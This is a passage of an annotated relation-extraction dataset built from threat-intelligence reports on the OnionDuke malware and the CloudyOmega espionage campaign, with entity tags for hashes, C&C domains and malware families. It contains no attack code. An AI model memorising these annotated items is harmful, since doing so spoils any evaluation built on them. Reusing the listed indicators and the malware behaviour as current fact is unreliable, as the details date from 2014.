"SHA-1"}], [{"name": "Backdoor:W32/OnionDuke.B", "pos": [13, 20], "sent_id": 18, "type": "Payload"}], [{"name": "OnionDuke", "pos": [16, 17], "sent_id": 22, "type": "MalwareFamily"}], [{"name": "d433f281cf56015941a1c2cb87066ca62ea1db37", "pos": [5, 6], "sent_id": 27, "type": "SHA-1"}], [{"name": "Backdoor:W32/OnionDuke.A", "pos": [9, 16], "sent_id": 27, "type": "Malware"}], [{"name": "overpict.com", "pos": [28, 29], "sent_id": 27, "type": "Indicator"}], [{"name": "overpict.com", "pos": [0, 1], "sent_id": 29, "type": "Indicator"}], [{"name": "2011", "pos": [10, 11], "sent_id": 29, "type": "Time"}], [{"name": "John Kasai", "pos": [16, 18], "sent_id": 29, "type": "Attacker"}], [{"name": "John Kasai", "pos": [8, 10], "sent_id": 30, "type": "Attacker"}], [{"name": "airtravelabroad.com", "pos": [17, 18], "sent_id": 30, "type": "Indicator"}], [{"name": "beijingnewsblog.net", "pos": [19, 20], "sent_id": 30, "type": "Indicator"}], [{"name": "grouptumbler.com", "pos": [21, 22], "sent_id": 30, "type": "Indicator"}], [{"name": "leveldelta.com", "pos": [23, 24], "sent_id": 30, "type": "Indicator"}], [{"name": "nasdaqblog.net", "pos": [25, 26], "sent_id": 30, "type": "Indicator"}], [{"name": "natureinhome.com", "pos": [27, 28], "sent_id": 30, "type": "Indicator"}], [{"name": "nestedmail.com", "pos": [29, 30], "sent_id": 30, "type": "Indicator"}], [{"name": "nostressjob.com", "pos": [31, 32], "sent_id": 30, "type": "Indicator"}], [{"name": "nytunion.com", "pos": [33, 34], "sent_id": 30, "type": "Indicator"}], [{"name": "oilnewsblog.com", "pos": [35, 36], "sent_id": 30, "type": "Indicator"}], [{"name": "sixsquare.net", "pos": [37, 38], "sent_id": 30, "type": "Indicator"}], [{"name": "ustradecomp.com", "pos": [39, 40], "sent_id": 30, "type": "Indicator"}], [{"name": "leveldelta.com", "pos": [6, 7], "sent_id": 31, "type": "Indicator"}], [{"name": "grouptumbler.com", "pos": [8, 9], "sent_id": 31, "type": "Indicator"}], [{"name": "MiniDuke", "pos": [18, 19], "sent_id": 31, "type": "MalwareFamily"}], [{"name": "OnionDuke", "pos": [5, 6], "sent_id": 32, "type": "MalwareFamily"}], [{"name": "MiniDuke", "pos": [7, 8], "sent_id": 32, "type": "MalwareFamily"}], [{"name": "OnionDuke", "pos": [7, 8], "sent_id": 33, "type": "MalwareFamily"}], [{"name": "MiniDuke", "pos": [9, 10], "sent_id": 33, "type": "MalwareFamily"}], [{"name": "OnionDuke", "pos": [26, 27], "sent_id": 33, "type": "MalwareFamily"}], [{"name": "October 2013", "pos": [39, 41], "sent_id": 33, "type": "Time"}], [{"name": "February of 2014", "pos": [10, 13], "sent_id": 34, "type": "Time"}], [{"name": "OnionDuke", "pos": [14, 15], "sent_id": 34, "type": "MalwareFamily"}], [{"name": "OnionDuke", "pos": [7, 8], "sent_id": 35, "type": "MalwareFamily"}], [{"name": "OnionDuke", "pos": [12, 13], "sent_id": 36, "type": "MalwareFamily"}], [{"name": "VPNs", "pos": [0, 1], "sent_id": 44, "type": "CourseOfAction"}], [{"name": "a75995f94854dea8799650a2f4a97980b71199d2", "pos": [3, 4], "sent_id": 47, "type": "MD5"}], [{"name": "b491c14d8cfb48636f6095b7b16555e9a575d57f", "pos": [0, 1], "sent_id": 48, "type": "MD5"}], [{"name": "d433f281cf56015941a1c2cb87066ca62ea1db37", "pos": [2, 3], "sent_id": 48, "type": "MD5"}], [{"name": "Trojan-Dropper:W32/OnionDuke.A", "pos": [6, 15], "sent_id": 48, "type": "Dropper"}], [{"name": "Backdoor:W32/OnionDuke.A", "pos": [16, 23], "sent_id": 48, "type": "Malware"}], [{"name": "Backdoor:W32/OnionDuke.B", "pos": [25, 32], "sent_id": 48, "type": "Malware"}]], "labels": [{"r": "P16", "h": 6, "t": 8, "evidence": [7, 13]}, {"r": "P32", "h": 8, "t": 1, "evidence": [2, 13]}, {"r": "P21", "h": 9, "t": 8, "evidence": [13, 18]}, {"r": "P13", "h": 8, "t": 10, "evidence": [13, 18]}, {"r": "P21", "h": 12, "t": 13, "evidence": [27]}, {"r": "P14", "h": 13, "t": 11, "evidence": [22, 27]}, {"r": "P21", "h": 14, "t": 13, "evidence": [27]}, {"r": "P21", "h": 15, "t": 13, "evidence": [27, 29]}, {"r": "P23", "h": 17, "t": 13, "evidence": [27, 29]}, {"r": "P21", "h": 47, "t": 48, "evidence": [48]}, {"r": "P21", "h": 46, "t": 48, "evidence": [48]}, {"r": "P21", "h": 45, "t": 48, "evidence": [47, 48]}, {"r": "P16", "h": 43, "t": 48, "evidence": [36, 48]}, {"r": "P16", "h": 43, "t": 49, "evidence": [36, 48]}, {"r": "P16", "h": 43, "t": 50, "evidence": [36, 48]}], "title": "201411FSecureOnionDuke", "sents": [["OnionDuke", ":", "APT", "Attacks"], ["Via", "the", "Tor", "Network", "-", "F", "-", "Secure", "Weblog", ":", "News", "from", "the", "Lab"], ["Recently", ",", "research", "was", "published", "identifying", "a", "Tor", "exit", "node", ",", "located", "in", "Russia", ",", "that", "was", "consistently", "and", "maliciously", "modifying", "any", "uncompressed", "Windows", "executables", "downloaded", "through", "it", "."], ["Naturally", "this", "piqued", "our", "interest", ",", "so", "we", "decided", "to", "peer", "down", "the", "rabbit", "hole", "."], ["Suffice", "to", "say", ",", "the", "hole", "was", "a", "lot", "deeper", "than", "we", "expected", "!"], ["In", "fact", ",", "it", "went", "all", "the", "way", "back", "to", "the", "notorious", "Russian", "APT", "family", "MiniDuke", ",", "known", "to", "have", "been", "used", "in", "targeted", "attacks", "against", "NATO", "and", "European", "government", "agencies", "."], ["The", "malware", "used", "in", "this", "case", "is", ",", "however", ",", "not", "a", "version", "of", "MiniDuke", "."], ["It", "is", "instead", "a", "separate", ",", "distinct", "family", "of", "malware", "that", "we", "have", "since", "taken", "to", "calling", "OnionDuke", "."], ["But", "lets", "start", "from", "the", "beginning", "."], ["When", "a", "user", "attempts", "to", "download", "an", "executable", "via", "the", "malicious", "Tor", "exit", "node", ",", "what", "they", "actually", "receive", "is", "an", "executable", "\"", "wrapper", "\"", "that", "embeds", "both", "the", "original", "executable", "and", "a", "second", ",", "malicious", "executable", "."], ["By", "using", "a", "separate", "wrapper", ",", "the", "malicious", "actors", "are", "able", "to", "bypass", "any", "integrity", "checks", "the", "original", "binary", "might", "contain", "."], ["Upon", "execution", ",", "the", "wrapper", "will", "proceed", "to", "write", "to", "disk", "and", "execute", "the", "original", "executable", ",", "thereby", "tricking", "the", "user", "into", "believing", "that", "everything", "went", "fine", "."], ["However", ",", "the", "wrapper", "will", "also", "write", "to", "disk", "and", "execute", "the", "second", "executable", "."], ["In", "all", "the", "cases", "we", "have", "observed", ",", "this", "malicious", "executable", "has", "been", "the", "same", "binary", "(", "SHA1", ":", "a75995f94854dea8799650a2f4a97980b71199d2", ",", "detected", "as", "Trojan", "-", "Dropper", ":", "W32", "/", "OnionDuke", ".", "A", ")", "."], ["This", "executable", "is", "a", "dropper", "containing", "a", "PE", "resource", "that", "pretends", "to", "be", "an", "embedded", "GIF", "image", "file", "."], ["In", "reality", ",", "the", "resource", "is", "actually", "an", "encrypted", "dynamically", "linked", "library", "(", "DLL", ")", "file", "."], ["The", "dropper", "will", "proceed", "to", "decrypt", "this", "DLL", ",", "write", "it", "to", "disk", "and", "execute", "it", "."], ["A", "flowchart", "of", "the", "infection", "process"], ["Once", "executed", ",", "the", "DLL", "file", "(", "SHA1", ":", "b491c14d8cfb48636f6095b7b16555e9a575d57f", ",", "detected", "as", "Backdoor", ":", "W32", "/", "OnionDuke", ".", "B", ")", "will", "decrypt", "an", "embedded", "configuration", "(", "shown", "below", ")", "and", "attempt", "to", "connect", "to", "hardcoded", "C&C", "URLs", "specified", "in", "the", "configuration", "data", "."], ["From", "these", "C&Cs", "the", "malware", "may", "receive", "instructions", "to", "download", "and", "execute", "additional", "malicious", "components", "."], ["It", "should", "be", "noted", ",", "that", "we", "believe", "all", "five", "domains", "contacted", "by", "the", "malware", "are", "innocent", "websites", "compromised", "by", "the", "malware", "operators", ",", "not", "dedicated", "malicious", "servers", "."], ["A", "screenshot", "of", "the", "embedded", "configuration", "data"], ["Through", "our", "research", ",", "we", "have", "also", "been", "able", "to", "identify", "multiple", "other", "components", "of", "the", "OnionDuke", "malware", "family", "."], ["We", "have", ",", "for", "instance", ",", "observed", "components", "dedicated", "to", "stealing", "login", "credentials", "from", "the", "victim", "machine", "and", "components", "dedicated", "to", "gathering", "further", "information", "on", "the", "compromised", "system", "like", "the", "presence", "of", "antivirus", "software", "or", "a", "firewall", "."], ["Some", "of", "these", "components", "have", "been", "observed", "being", "downloaded", "and", "executed", "by", "the", "original", "backdoor", "process", "but", "for", "other", "components", ",", "we", "have", "yet", "to", "identify", "the", "infection", "vector", "."], ["Most", "of", "these", "components", "do", "n't", "embed", "their", "own", "C&C", "information", "but", "rather", "communicate", "with", "their", "controllers", "through", "the", "original", "backdoor", "process", "."], ["One", "component", ",", "however", ",", "is", "an", "interesting", "exception", "."], ["This", "DLL", "file", "(", "SHA1", "d433f281cf56015941a1c2cb87066ca62ea1db37", ",", "detected", "as", "Backdoor", ":", "W32", "/", "OnionDuke", ".", "A", ")", "contains", "among", "its", "configuration", "data", "a", "different", "hardcoded", "C&C", "domain", ",", "overpict.com", "and", "also", "evidence", "suggesting", "that", "this", "component", "may", "abuse", "Twitter", "as", "an", "additional", "C&C", "channel", "."], ["What", "makes", "the"], ["overpict.com", "domain", "interesting", ",", "is", "it", "was", "originally", "registered", "in", "2011", "with", "the", "alias", "of", "\"", "John", "Kasai", "\"", "."], ["Within", "a", "two", "-", "week", "window", ",", "\"", "John", "Kasai", "\"", "also", "registered", "the", "following", "domains", ":", "airtravelabroad.com", ",", "beijingnewsblog.net", ",", "grouptumbler.com", ",", "leveldelta.com", ",", "nasdaqblog.net", ",", "natureinhome.com", ",", "nestedmail.com", ",", "nostressjob.com", ",", "nytunion.com", ",", "oilnewsblog.com", ",", "sixsquare.net", "and", "ustradecomp.com", "."], ["This", "is", "significant", "because", "the", "domains", "leveldelta.com", "and", "grouptumbler.com", "have", "previously", "been", "identified", "as", "C&C", "domains", "used", "by", "MiniDuke", "."], ["This", "strongly", "suggests", "that", "although", "OnionDuke", "and", "MiniDuke", "are", "two", "separate", "families", "of", "malware", ",", "the", "actors", "behind", "them", "are", "connected", "through", "the", "use", "of", "shared", "infrastructure", "."], ["A", "visualization", "of", "the", "infrastructure", "shared", "between", "OnionDuke", "and", "MiniDuke", "Based", "on", "compilation", "timestamps", "and", "discovery", "dates", "of", "samples", "we", "have", "observed", ",", "we", "believe", "the", "OnionDuke", "operators", "have", "been", "infecting", "downloaded", "executables", "at", "least", "since", "the", "end", "of", "October", "2013", "."], ["We", "also", "have", "evidence", "suggesting", "that", ",", "at", "least", "since", "February", "of", "2014", ",", "OnionDuke", "has", "not", "only", "been", "spread", "by", "modifying", "downloaded", "executables", "but", "also", "by", "infecting", "executables", "in", ".torrent", "files", "containing", "pirated", "software", "."], ["However", ",", "it", "would", "seem", "that", "the", "OnionDuke", "family", "is", "much", "older", ",", "both", "based", "on", "older", "compilation", "timestamps", "and", "also", "on", "the", "fact", "that", "some", "of", "the", "embedded", "configuration", "data", "make", "reference", "to", "an", "apparent", "version", "number", "of", "4", "suggesting", "that", "at", "least", "three", "earlier", "versions", "of", "the", "family", "exist", "."], ["During", "our", "research", ",", "we", "have", "also", "uncovered", "strong", "evidence", "suggesting", "that", "OnionDuke", "has", "been", "used", "in", "targeted", "attacks", "against", "European", "government", "agencies", ",", "although", "we", "have", "so", "far", "been", "unable", "to", "identify", "the", "infection", "vector(s", ")", "."], ["Interestingly", ",", "this", "would", "suggest", "two", "very", "different", "targeting", "strategies", "."], ["On", "one", "hand", "is", "the", "\"", "shooting", "a", "fly", "with", "a", "cannon", "\"", "mass", "-", "infection", "strategy", "through", "modified", "binaries", "and", ",", "on", "the", "other", ",", "the", "more", "surgical", "targeting", "traditionally", "associated", "with", "APT", "operations", "."], ["In", "any", "case", ",", "although", "much", "is", "still", "shrouded", "in", "mystery", "and", "speculation", ",", "one", "thing", "is", "certain", "."], ["While", "using"], ["Tor", "may", "help", "you", "stay", "anonymous", ",", "it", "does", "at", "the", "same", "time", "paint", "a", "huge", "target", "on", "your", "back", "."], ["It", "'s", "never", "a", "good", "idea", "to", "download", "binaries", "via", "Tor", "(", "or", "anything", "else", ")", "without", "encryption", "."], ["The", "problem", "with", "Tor", "is", "that", "you", "have", "no", "idea", "who", "is", "maintaining", "the", "exit", "node", "you", "are", "using", "and", "what", "their", "motives", "are", "."], ["VPNs"], ["(", "such", "as", "our", "Freedome", "VPN", ")"], ["will", "encrypt", "your", "connection", "all", "the", "way", "through", "the", "Tor", "network", ",", "so", "the", "maintainers", "of", "Tor", "exit", "nodes", "will", "not", "see", "your", "traffic", "and", "ca", "n't", "tamper", "with", "it", "."], ["Samples", ":", "\u2022", "a75995f94854dea8799650a2f4a97980b71199d2", "\u2022"], ["b491c14d8cfb48636f6095b7b16555e9a575d57f", "\u2022", "d433f281cf56015941a1c2cb87066ca62ea1db37", "Detected", "as", ":", "Trojan", "-", "Dropper", ":", "W32", "/", "OnionDuke", ".", "A", ",", "Backdoor", ":", "W32", "/", "OnionDuke", ".", "A", ",", "and", "Backdoor", ":", "W32", "/", "OnionDuke", ".", "B.", "Post", "by", "\u2014", "Artturi", "(", "@lehtior2", ")"]]}, {"vertexSet": [[{"name": "Operation CloudyOmega", "pos": [0, 2], "sent_id": 0, "type": "Campaign"}], [{"name": "Japan", "pos": [9, 10], "sent_id": 1, "type": "ExploitTargetObject"}], [{"name": "JustSystems", "pos": [10, 11], "sent_id": 1, "type": "Organization"}], [{"name": "Ichitaro", "pos": [17, 18], "sent_id": 1, "type": "Software"}], [{"name": "Symantec", "pos": [19, 20], "sent_id": 3, "type": "Organization"}], [{"name": "Bloodhound.Exploit.557", "pos": [23, 26], "sent_id": 3, "type": "Malware"}], [{"name": "Backdoor.Emdivi", "pos": [6, 9], "sent_id": 4, "type": "Payload"}], [{"name": "Backdoor.Korplug", "pos": [10, 13], "sent_id": 4, "type": "Payload"}], [{"name": "Backdoor.ZXshell", "pos": [15, 18], "sent_id": 4, "type": "Payload"}], [{"name": "CloudyOmega", "pos": [6, 7], "sent_id": 12, "type": "Campaign"}], [{"name": "Backdoor.Emdivi", "pos": [6, 9], "sent_id": 13, "type": "Payload"}], [{"name": "Ichitaro", "pos": [15, 16], "sent_id": 16, "type": "Software"}], [{"name": "2011", "pos": [13, 14], "sent_id": 20, "type": "Time"}], [{"name": "2014", "pos": [17, 18], "sent_id": 22, "type": "Time"}], [{"name": "CloudyOmega", "pos": [16, 17], "sent_id": 23, "type": "Campaign"}], [{"name": "email", "pos": [7, 8], "sent_id": 30, "type": "Email"}], [{"name": ".zip files", "pos": [6, 8], "sent_id": 31, "type": "File"}], [{"name": "Backdoor.Emdivi", "pos": [4, 7], "sent_id": 39, "type": "Payload"}], [{"name": "CloudyOmega", "pos": [7, 8], "sent_id": 40, "type": "Campaign"}], [{"name": "2011", "pos": [14, 15], "sent_id": 40, "type": "Time"}], [{"name": "Japanese chemical company", "pos": [24, 27], "sent_id": 40, "type": "ExploitTargetObject"}], [{"name": "Emdivi", "pos": [0, 1], "sent_id": 41, "type": "Malware"}], [{"name": "Emdivi", "pos": [1, 2], "sent_id": 42, "type": "Malware"}], [{"name": "Type S", "pos": [16, 18], "sent_id": 42, "type": "MalwareCharacteristics"}], [{"name": "Type T", "pos": [19, 21], "sent_id": 42, "type": "MalwareCharacteristics"}], [{"name": "Emdivi", "pos": [11, 12], "sent_id": 43, "type": "Malware"}], [{"name": "Emdivi", "pos": [1, 2], "sent_id": 45, "type": "Malware"}], [{"name": "Type S", "pos": [2, 4], "sent_id": 45, "type": "MalwareCharacteristics"}], [{"name": "Type T", "pos": [5, 7], "sent_id": 45, "type": "MalwareCharacteristics"}], [{"name": "CloudyOmega", "pos": [13, 14], "sent_id": 47, "type": "Campaign"}], [{"name": "2011", "pos": [27, 28], "sent_id": 47, "type": "Time"}], [{"name": "C++ programing language", "pos": [34, 37], "sent_id": 47, "type": "SourceCodeInformation"}], [{"name": "Type T", "pos": [0, 2], "sent_id": 48, "type": "Malware"}], [{"name": "Type T", "pos": [3, 5], "sent_id": 49, "type": "Malware"}], [{"name": "Type S", "pos": [21, 23], "sent_id": 50, "type": "Malware"}], [{"name": "Type S", "pos": [0, 2], "sent_id": 51, "type": "Malware"}], [{"name": "Type T", "pos": [17, 19], "sent_id": 51, "type": "Malware"}], [{"name": "Type S", "pos": [17, 19], "sent_id": 52, "type": "Malware"}], [{"name": "Type S", "pos": [4, 6], "sent_id": 53, "type": "Malware"}], [{"name": "Emdivi Type S", "pos": [4, 7], "sent_id": 56, "type": "Malware"}], [{"name": "Emdivi", "pos": [2, 3], "sent_id": 57, "type": "Malware"}], [{"name": "Emdivi", "pos": [3, 4], "sent_id": 58, "type": "Malware"}], [{"name": "Backdoor.Emdivi", "pos": [18, 21], "sent_id": 66, "type": "Malware"}], [{"name": "Backdoor.Emdivi", "pos": [23, 26], "sent_id": 68, "type": "Malware"}], [{"name": "Backdoor.Emdivi", "pos": [30, 33], "sent_id": 68, "type": "Malware"}], [{"name": "CloudyOmega's", "pos": [29, 31], "sent_id": 70, "type": "Campaign"}], [{"name": "CloudyOmega", "pos": [5, 6], "sent_id": 71, "type": "Campaign"}], [{"name": "CVE-2012-5054", "pos": [4, 7], "sent_id": 72, "type": "Vulnerability"}], [{"name": "Backdoor.Emdivi", "pos": [7, 10], "sent_id": 74, "type": "Malware"}], [{"name": "CVE2012-5054", "pos": [1, 4], "sent_id": 75, "type": "Vulnerability"}], [{"name": "Emdivi", "pos": [10, 11], "sent_id": 76, "type": "Malware"}], [{"name": "2012", "pos": [13, 14], "sent_id": 76, "type": "Time"}], [{"name": "LadyBoyle", "pos": [20, 21], "sent_id": 76, "type": "Campaign"}], [{"name": "2013", "pos": [23, 24], "sent_id": 76, "type": "Time"}], [{"name": "malformed SWF file", "pos": [4, 7], "sent_id": 77, "type": "Malware"}], [{"name": "CVE-2013-0634", "pos": [20, 23], "sent_id": 77, "type": "Vulnerability"}], [{"name": "CVE-2013-0634", "pos": [28, 31], "sent_id": 77, "type": "Vulnerability"}], [{"name": "CloudyOmega", "pos": [15, 16], "sent_id": 78, "type": "Campaign"}], [{"name": "LadyBoyle", "pos": [6, 7], "sent_id": 80, "type": "Campaign"}], [{"name": "February 2013", "pos": [9, 11], "sent_id": 80, "type": "Time"}], [{"name": "Adobe Flash", "pos": [8, 10], "sent_id": 81, "type": "Software"}], [{"name": "Symantec", "pos": [15, 16], "sent_id": 82, "type": "Organization"}], [{"name": "Ichitaro", "pos": [7, 8], "sent_id": 83, "type": "Software"}], [{"name": "Backdoor.Emdivi", "pos": [7, 10], "sent_id": 85, "type": "Payload"}], [{"name": "Backdoor.Korplug", "pos": [11, 14], "sent_id": 85, "type": "Payload"}], [{"name": "Backdoor.ZXshell", "pos": [16, 19], "sent_id": 85, "type": "Payload"}], [{"name": "CloudyOmega", "pos": [9, 10], "sent_id": 87, "type": "Campaign"}], [{"name": "attack group", "pos": [14, 16], "sent_id": 87, "type": "AttackerGroup"}], [{"name": "Hidden Lynx", "pos": [26, 28], "sent_id": 87, "type": "AttackerGroup"}], [{"name": "LadyBoyle", "pos": [33, 34], "sent_id": 87, "type": "Campaign"}], [{"name": "CloudyOmega", "pos": [0, 1], "sent_id": 88, "type": "Campaign"}], [{"name": "2011", "pos": [6, 7], "sent_id": 88, "type": "Time"}], [{"name": "Symantec", "pos": [0, 1], "sent_id": 90, "type": "Organization"}], [{"name": "CloudyOmega", "pos": [11, 12], "sent_id": 90, "type": "Campaign"}], [{"name": "Ichitaro", "pos": [7, 8], "sent_id": 92, "type": "Software"}], [{"name": "CloudyOmega", "pos": [10, 11], "sent_id": 93, "type": "Campaign"}], [{"name": "Backdoor.Emdivi", "pos": [13, 16], "sent_id": 93, "type": "Malware"}], [{"name": "Backdoor.Emdivi!gen1", "pos": [16, 19], "sent_id": 93, "type": "Malware"}], [{"name": "Backdoor.Emdivi!gen2", "pos": [0, 3], "sent_id": 94, "type": "Malware"}], [{"name": "Bloodhound.Exploit.557", "pos": [0, 3], "sent_id": 95, "type": "Malware"}], [{"name": "Trojan.Mdropper", "pos": [3, 6], "sent_id": 95, "type": "TrojanHorse"}]], "labels": [{"r": "P27", "h": 0, "t": 1, "evidence": [0, 1]}, {"r": "P13", "h": 5, "t": 6, "evidence": [3, 4]}, {"r": "P13", "h": 5, "t": 7, "evidence": [3, 4]}, {"r": "P13", "h": 5, "t": 8, "evidence": [3, 4]}, {"r": "P17", "h": 2, "t": 3, "evidence": [1]}, {"r": "P33", "h": 9, "t": 12, "evidence": [12, 20]}, {"r": "P33", "h": 9, "t": 13, "evidence": [12, 22]}, {"r": "P9", "h": 15, "t": 16, "evidence": [30, 31]}, {"r": "P21", "h": 15, "t": 5, "evidence": [3, 30]}, {"r": "P33", "h": 18, "t": 19, "evidence": [40]}, {"r": "P27", "h": 18, "t": 20, "evidence": [40]}, {"r": "P22", "h": 18, "t": 21, "evidence": [40, 41]}, {"r": "P13", "h": 22, "t": 23, "evidence": [42]}, {"r": "P13", "h": 22, "t": 24, "evidence": [42]}, {"r": "P13", "h": 26, "t": 27, "evidence": [45]}, {"r": "P13", "h": 26, "t": 28, "evidence": [45]}, {"r": "P22", "h": 29, "t": 26, "evidence": [45, 47]}, {"r": "P33", "h": 29, "t": 30, "evidence": [47]}, {"r": "P22", "h": 29, "t": 32, "evidence": [47, 48]}, {"r": "P22", "h": 29, "t": 33, "evidence": [47, 49]}, {"r": "P22", "h": 29, "t": 34, "evidence": [47, 50]}, {"r": "P7", "h": 44, "t": 47, "evidence": [68, 72]}, {"r": "P7", "h": 48, "t": 49, "evidence": [74, 75]}, {"r": "P33", "h": 50, "t": 51, "evidence": [76]}, {"r": "P33", "h": 52, "t": 53, "evidence": [76]}, {"r": "P7", "h": 54, "t": 55, "evidence": [77]}, {"r": "P7", "h": 54, "t": 56, "evidence": [77]}, {"r": "P33", "h": 58, "t": 59, "evidence": [80]}, {"r": "P33", "h": 70, "t": 71, "evidence": [88]}], "title": "201411SymantecCloudyOmega", "sents": [["Operation", "CloudyOmega", ":"], ["Ichitaro", "zero", "-", "day", "and", "ongoing", "cyberespionage", "campaign", "targeting", "Japan", "JustSystems", "has", "issued", "an", "update", "to", "its", "Ichitaro", "product", "line", "(", "Japanese", "office", "suite", "software", ")", ",", "plugging", "a", "zero", "-", "day", "vulnerability", "."], ["This", "vulnerability", "is", "being", "actively", "exploited", "in", "the", "wild", "to", "specifically", "target", "Japanese", "organizations", "."], ["The", "exploit", "is", "sent", "to", "the", "targeted", "organizations", "through", "emails", "with", "a", "malicious", "Ichitaro", "document", "file", "attached", ",", "which", "Symantec", "products", "detect", "as", "Bloodhound", ".", "Exploit.557", "."], ["Payloads", "from", "the", "exploit", "may", "include", "Backdoor", ".", "Emdivi", ",", "Backdoor", ".", "Korplug", ",", "and", "Backdoor", ".", "ZXshell", ";", "however", ",", "all", "payloads", "aim", "to", "steal", "confidential", "information", "from", "the", "compromised", "computer", "."], ["The", "content", "of", "the", "emails", "vary", "depending", "on", "the", "business", "interest", "of", "the", "targeted", "recipient", "\u2019s", "organization", ";", "however", ",", "all", "are", "about", "recent", "political", "events", "associated", "with", "Japan", "."], ["Opening", "the", "malicious", "attachment", "with", "Ichitaro", "will", "drop", "the", "payload", "and", "display", "the", "document", "."], ["Often", "such", "exploitation", "attempts", "crash", "and", "then", "relaunch", "the", "document", "viewer", "to", "open", "a", "clean", "document", "in", "order", "to", "trick", "users", "into", "believing", "it", "is", "legitimate", "."], ["In", "this", "particular", "attack", ",", "opening", "the", "document", "and", "dropping", "the", "payload", "are", "done", "without", "crashing", "Ichitaro", "and", ",", "as", "such", ",", "users", "have", "no", "visual", "indications", "as", "to", "what", "is", "really", "happening", "in", "the", "background", "."], ["CloudyOmega"], ["As", "Security", "Response", "previously", "discussed", ",", "unpatched", "vulnerabilities", "being", "exploited", "is", "nothing", "new", "for", "Ichitaro", "."], ["However", ",", "during", "our", "investigation", "of", "this", "Ichitaro", "zero", "-", "day", "attack", ",", "we", "discovered", "that", "the", "attack", "was", "in", "fact", "part", "of", "an", "ongoing", "cyberespionage", "campaign", "specifically", "targeting", "various", "Japanese", "organizations", "."], ["Symantec", "has", "named", "this", "attack", "campaign", "CloudyOmega", "."], ["In", "this", "campaign", ",", "variants", "of", "Backdoor", ".", "Emdivi", "are", "persistently", "used", "as", "a", "payload", "."], ["All", "attacks", "arrive", "on", "the", "target", "computers", "as", "an", "attachment", "to", "email", "messages", "."], ["Mostly", "the", "attachments", "are", "in", "a", "simple", "executable", "format", "with", "a", "fake", "icon", "."], ["However", ",", "some", "of", "the", "files", "exploit", "software", "vulnerabilities", ",", "and", "the", "aforementioned", "vulnerability", "in", "Ichitaro", "software", "is", "only", "one", "of", "them", "."], ["This", "group", "\u2019s", "primary", "goal", "is", "to", "steal", "confidential", "information", "from", "targeted", "organizations", "."], ["This", "blog", "provides", "insights", "into", "the", "history", "of", "the", "attack", "campaign", ",", "infection", "methods", ",", "malware", "payload", ",", "and", "the", "group", "carrying", "out", "the", "attacks", "."], ["Timeline"], ["The", "first", "attack", "of", "the", "campaign", "can", "be", "traced", "back", "to", "at", "least", "2011", "."], ["Figure", "1", "shows", "the", "targeted", "sectors", "and", "the", "number", "of", "attacks", "carried", "out", "each", "year", "."], ["The", "perpetrators", "were", "very", "cautious", "launching", "attacks", "in", "the", "early", "years", "with", "attacks", "beginning", "in", "earnest", "in", "2014", "."], ["By", "far", ",", "the", "public", "sector", "in", "Japan", "is", "the", "most", "targeted", "sector", "hit", "by", "Operation", "CloudyOmega", "."], ["This", "provides", "some", "clue", "as", "to", "who", "the", "attack", "group", "is", "."], ["Figure", "1", "."], ["Targeted", "sectors", "and", "number", "of", "attacks", "Attack", "vector"], ["Email", "is", "the", "predominant", "infection", "vector", "used", "in", "this", "campaign", "."], ["Figure", "2", "."], ["Sample", "email", "used", "in", "attack", "campaign"], ["Figure", "2", "is", "an", "example", "of", "an", "email", "used", "in", "recent", "attacks", "prior", "to", "those", "exploiting", "the", "Ichitaro", "zero", "-", "day", "vulnerability", "."], ["The", "emails", "include", "password", "-", "protected", ".zip", "files", "containing", "the", "malware", "."], ["Ironically", ",", "the", "attackers", "follow", "security", "best", "practices", "by", "indicating", "in", "the", "first", "email", "that", "the", "password", "will", "be", "sent", "to", "the", "recipient", "in", "a", "separate", "email", "."], ["This", "is", "merely", "to", "trick", "the", "recipient", "into", "believing", "the", "email", "is", "from", "a", "legitimate", "and", "trustworthy", "source", "."], ["The", "body", "of", "the", "email", "is", "very", "short", "and", "claims", "the", "attachment", "includes", "a", "medical", "receipt", "."], ["The", "email", "also", "requests", "that", "the", "recipient", "open", "the", "attachment", "on", "a", "Windows", "computer", "."], ["The", "file", "in", "the", "attachment", "has", "a", "Microsoft", "Word", "icon", "but", ",", "as", "indicated", "within", "Windows", "Explorer", ",", "it", "is", "an", "executable", "file", "."], ["Figure", "3", "."], ["Attached", "\u201c", "document", "\u201d", "is", "actually", "a", "malicious", "executable", "file", "Payload"], ["The", "malicious", "payload", "is", "Backdoor", ".", "Emdivi", ",", "a", "threat", "that", "opens", "a", "back", "door", "on", "the", "compromised", "computer", "."], ["The", "malware", "is", "exclusively", "used", "in", "the", "CloudyOmega", "attack", "campaign", "and", "first", "appeared", "in", "2011", "when", "it", "was", "used", "in", "an", "attack", "against", "a", "Japanese", "chemical", "company", "."], ["Emdivi", "allows", "the", "remote", "attacker", "executing", "the", "commands", "to", "send", "the", "results", "back", "to", "the", "command", "-", "and", "-", "control", "(", "C&C", ")", "server", "through", "HTTP", "."], ["Each", "Emdivi", "variant", "has", "a", "unique", "version", "number", "and", "belongs", "to", "one", "of", "two", "types", ":", "Type", "S", "and", "Type", "T."], ["The", "unique", "version", "number", "is", "not", "only", "a", "clear", "sign", "that", "Emdivi", "is", "systematically", "managed", ",", "but", "it", "also", "acts", "as", "an", "encryption", "key", "."], ["The", "malware", "adds", "extra", "words", "to", "the", "version", "number", "and", "then", ",", "based", "on", "this", ",", "generates", "a", "hash", ",", "which", "it", "uses", "as", "an", "encryption", "key", "."], ["Both", "Emdivi", "Type", "S", "and", "Type", "T", "share", "the", "following", "functionality", ":"], ["Allow", "a", "remote", "attacker", "to", "execute", "code", "through", "HTTP"], ["Steal", "credentials", "stored", "by", "Internet", "Explorer", "Type", "T", "is", "primarily", "used", "in", "Operation", "CloudyOmega", ",", "has", "been", "in", "constant", "development", "since", "the", "campaign", "was", "first", "launched", "in", "2011", ",", "and", "is", "written", "in", "the", "C++", "programing", "language", "."], ["Type", "T", "employs", "techniques", "to", "protect", "itself", "from", "security", "vendors", "or", "network", "administrators", "."], ["Important", "parts", "of", "Type", "T", ",", "such", "as", "the", "C&C", "server", "address", "it", "contacts", "and", "its", "protection", "mechanisms", ",", "are", "encrypted", "."], ["Type", "T", "also", "detects", "the", "presence", "of", "automatic", "analysis", "systems", "or", "debuggers", ",", "such", "as", "the", "following", ":", "VirtualMachine", "Debugger", "Sandbox", "Type", "S", ",", "on", "the", "other", "hand", ",", "was", "used", "only", "twice", "in", "the", "attack", "campaign", "."], ["Type", "S", "is", "a", ".NET", "application", "based", "on", "the", "same", "source", "code", "and", "shared", "C&C", "infrastructure", "as", "Type", "T."], ["However", ",", "protection", "mechanisms", "and", "encryption", ",", "essential", "features", "for", "threat", "survival", ",", "are", "not", "present", "in", "Type", "S."], ["One", "interesting", 